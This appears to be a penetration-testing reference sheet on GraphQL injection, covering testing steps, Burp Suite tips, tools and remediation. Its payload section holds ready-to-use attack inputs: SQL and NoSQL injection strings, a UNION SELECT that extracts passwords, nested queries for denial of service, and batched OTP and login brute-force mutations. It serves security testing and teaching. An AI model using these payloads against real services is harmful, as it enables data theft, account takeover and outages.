# GraphQL Injection

## Overview
GraphQL injection refers to the injection of malicious data or query structures into GraphQL operations that are processed by the server without proper validation. This includes injecting into dynamic GraphQL query construction (analogous to SQLi), abusing field arguments to bypass filters, and leveraging query batching or aliases to perform attacks at scale. Distinct from GraphQL authorization issues, this focuses on input-level injection.

## How It Works
- Some applications construct GraphQL queries dynamically by concatenating user input — enabling injection of query fragments.
- GraphQL arguments may be passed to underlying database queries, shell commands, or template renderers without sanitization.
- Alias abuse: sending the same query with different aliases in a single request to bypass per-query rate limits.
- Field argument injection: injecting into `where`, `filter`, `orderBy` clauses that map to SQL/NoSQL queries.
- Introspection fields expose internal data types and mutation parameters.

## Impact
- SQL injection via GraphQL argument → database exfiltration.
- NoSQL injection in GraphQL resolvers using MongoDB operators.
- SSRF via URL-accepting arguments.
- Brute force of OTP/passwords via batched mutations bypassing rate limits.
- DoS via deeply nested or circular queries consuming server resources.

## Where to Look
- GraphQL arguments that appear to filter, sort, or search: `where`, `filter`, `query`, `search`, `orderBy`.
- Mutations that accept URLs, commands, or file paths as arguments.
- Any argument that appears to be SQL-backed (returns database-like errors).
- String arguments in queries that construct internal expressions.

## Testing Steps
1. Enable introspection to map the full schema.
2. For each query/mutation, test string arguments for SQL injection: `' OR '1'='1`.
3. Test NoSQL injection: `{"$gt": ""}`, `{"$where": "sleep(5000)"}`.
4. Try deeply nested queries to exhaust server resources (query complexity attack).
5. Use aliases to batch multiple login attempts in a single request.
6. Check if filter/where arguments accept raw database operators.
7. Test for SSTI in string arguments that might be rendered server-side.

## Payloads / Techniques
```graphql
# SQL injection via argument
{
  users(filter: "1=1 OR 1=1--") { id email }
}

# NoSQL injection (MongoDB)
{
  users(where: {email: {_eq: {"$gt": ""}}}) { id email }
}

# Deeply nested query (complexity DoS)
{
  user {
    friends {
      friends {
        friends {
          friends { id }
        }
      }
    }
  }
}

# Alias batching — brute force OTP in one request
mutation {
  a1: verifyOtp(otp: "0000") { success }
  a2: verifyOtp(otp: "0001") { success }
  a3: verifyOtp(otp: "0002") { success }
  ...
  a9999: verifyOtp(otp: "9999") { success }
}

# Array batching — multiple login attempts
[
  {"query": "mutation { login(user: \"admin\", pass: \"pass1\") { token } }"},
  {"query": "mutation { login(user: \"admin\", pass: \"pass2\") { token } }"},
  ...
]

# Field argument injection into dynamic query
{
  products(search: "shoes' UNION SELECT null,null,password FROM users--") {
    name
    description
  }
}
```

## Burp Suite Tips
- **InQL extension** (BApp Store) provides a complete schema browser and query editor.
- Use **Repeater** to manually craft injection payloads into GraphQL arguments.
- **Intruder** can be used with GraphQL mutations for brute-force testing.
- Check for slow responses when sending complex nested queries (complexity DoS indication).
- Use **Logger++** to capture all GraphQL requests during application browsing.

## Tools
- InQL — Burp extension for GraphQL testing
- graphql-cop — https://github.com/dolevf/graphql-cop (security audit)
- Clairvoyance — schema discovery without introspection
- Altair / GraphQL Playground — for crafting manual injection payloads

## Remediation
- Use parameterized GraphQL resolvers — pass arguments as variables, not string interpolation.
- Implement query depth limiting and complexity analysis middleware.
- Disable or restrict query batching and alias usage on sensitive mutations.
- Validate and sanitize all input arguments before passing to underlying data stores.
- Rate limit GraphQL operations per user per time window.
- Use persisted queries in production to restrict to known-good query shapes.

## References
https://portswigger.net/web-security/graphql/security-issues
https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/12-API_Testing/01-Testing_GraphQL
https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
https://github.com/nicholasaleks/Damn-Vulnerable-GraphQL-Application
